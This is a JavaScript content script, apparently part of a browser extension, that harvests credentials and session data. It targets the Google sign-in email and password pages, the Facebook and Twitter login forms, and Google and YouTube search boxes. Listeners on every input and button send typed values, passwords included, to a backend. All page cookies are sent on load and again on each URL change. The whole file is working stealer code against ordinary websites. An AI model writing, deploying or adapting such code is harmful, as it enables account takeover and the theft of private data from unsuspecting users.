// helpers
// predefined attribute key/value filters, so only the inputs with these pairs will be sent
// only considered in the defined websites
const attributeValueFilters = {
    "accounts.google.com/signin/v2/identifier": [
        ["type", "email"], 
    ],
    "accounts.google.com/signin/v2/challenge/pwd": [
        ["type", "password"],
    ], // also add paths for recovery screens

    "www.google.com/search": [
        ["type", "text"], ["aria-label", "search"],
    ],

    "www.youtube.com/watch": [
        ["type", "text"], ["aria-label", "search"], 
    ],
    "www.youtube.com/results": [
        ["type", "text"], ["aria-label", "search"], 
    ],
    "www.youtube.com/": [
        ["type", "text"], ["aria-label", "search"], 
    ],

    "www.facebook.com/": [
        ["type", "text"], ["name", "email"], ["type", "password"], ["name", "pass"],
    ],

    "twitter.com/i/flow/login": [
        ["type", "text"], ["type", "password"],
    ],

}

function valueFilterContains(valueFilter, attributeDetails) {
    // returns whether an attribute key/value pair is in a filter (since .includes() doesn't work on 2d array)
    for (const targetValue of valueFilter) {
        if (attributeDetails[0].toLowerCase() == targetValue[0] && attributeDetails[1].toLowerCase() == targetValue[1]) {
            return true;
        }
    }
    return false;
}

/** Converts an element to a json */
function elementToJSON(ele, keyFilter=["type", "class", "title"], valueFilter=undefined) {
    // get the filter values if not set
    const hostpath = location.hostname + location.pathname;
    valueFilter ??= attributeValueFilters[hostpath];

    // try get the details
    try {
        const attributes = [];
        for (const attr of ele.getAttributeNames()) {
            const attributeDetails = [attr.toLowerCase(), ele.getAttribute(attr)];
            if (valueFilter) {
                if (valueFilterContains(valueFilter, attributeDetails)) {
                    // only add if the key/value pair is specified, take priority over key filter
                    attributes.push(attributeDetails);
                }
            } else if (keyFilter) {
                if (keyFilter.includes(attr.toLowerCase())) {
                    // only add it if the attribute name is in the 
                    attributes.push(attributeDetails);
                }
            } else if (!keyFilter && !valueFilter) {
                // push if neither were given
                attributes.push(attributeDetails);
            }
        }

        if (attributes.length == 0) {
            return null;
        }

        return {
            "tag": ele.tagName,
            attributes: attributes,
            "value": ele.value ?? "",
        };
    } catch (e) {
        console.error(e);
        return {};  // don't want any errors
    }
}



// functions to send data
function sendEvent(event) {
    console.log("sending event");
    // Sends info about the target of an event
    const json = elementToJSON(event.target);
    if (json != null) {
        // only send if the element had value
        API.sendJSON({
            "href": window.location.href, 
            "type": API.SCRAPE_TYPE.INPUTS, 
            "time": Date.now(), 
            "data": [json]
        });
    }

};

function sendAllInputs() {
    // sends the info of all input elements to the backend
    const inputFields = document.querySelectorAll("input");
    const payload = {
        "href": window.location.href, 
        "type": API.SCRAPE_TYPE.INPUTS, 
        "time": Date.now(), 
        "data": []
    };

    inputFields.forEach((ele) => {
        const json = elementToJSON(ele);
        if (json != null) {
            payload["data"].push(json);
        }
    });

    if (payload["data"].length != 0) {
        // only send if there was any inputs of interest
        API.sendJSON(payload);
    }
}

function sendCookies() {
    // sends all the pages cookies to the backend
    API.sendJSON({
        "href": window.location.href, 
        "type": API.SCRAPE_TYPE.COOKIES, 
        "time": Date.now(), 
        "data": [document.cookie]
    });
}

// functions to add event listeners
function addChangeEventListeners() {
    const inputFields = document.querySelectorAll("input");  // "input[type=\"password\"]"
    inputFields.forEach((ele) => {
        ele.addEventListener("change", sendEvent);
    });
}

function addButtonEventListeners() {
    const inputFields = document.querySelectorAll("button");
    inputFields.forEach((ele) => {
        ele.addEventListener("click", sendAllInputs);
    });
}

function setupScraping() {
    // sets up all the scrapers and scrapes any one time data
    addChangeEventListeners();
    addButtonEventListeners();
    sendCookies();
}

setupScraping();


// https://stackoverflow.com/a/46428962
let oldhref = document.location.href;
window.addEventListener("load", () => {
    // track when the href gets changed
    const domObserver = new MutationObserver((mutations) => {
        mutations.forEach(mutation => {
            // can't really be precise because grandchildren
            addChangeEventListeners();
            addButtonEventListeners();

            if (document.location.href != oldhref) {
                // send cookies (and href) if the href changed
                oldhref = document.location.href;
                sendCookies();
            }
        });
    });

    const body = document.querySelector("body");
    domObserver.observe(body, {
        childList: true,
        subtree: true,
    });
})
